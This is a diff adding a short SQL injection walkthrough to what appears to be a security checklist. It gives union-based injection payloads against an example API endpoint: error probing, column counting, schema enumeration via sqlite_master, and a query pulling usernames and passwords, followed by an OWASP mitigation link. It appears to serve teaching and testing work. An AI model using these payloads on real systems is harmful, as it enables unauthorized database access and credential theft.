@@ -103,5 +103,14 @@ Remove any .git folders from backend. Existing or own script/plugin might help t
 
 ## SQL injection
 
+1. Check the database type by error message (by doing intentional error query) 
+/api/v2/?id=[x]
+2. Check amount of columns in query for future union query by iterating over ```order by``` values until the point server reply valid response:
+/api/v2/?id=1' order by 3--+
+3. Find out special tables for target database to query tables in db. e.g. for sqlite:
+/api/v2/?id=1' union select 1,1,1 from sqlite_master
+4. Pocking specific table to find out right column names:
+/api/v2/?id=1'  or id='1' union select username,password from users-- -+
+
 Mitigation steps:
 https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
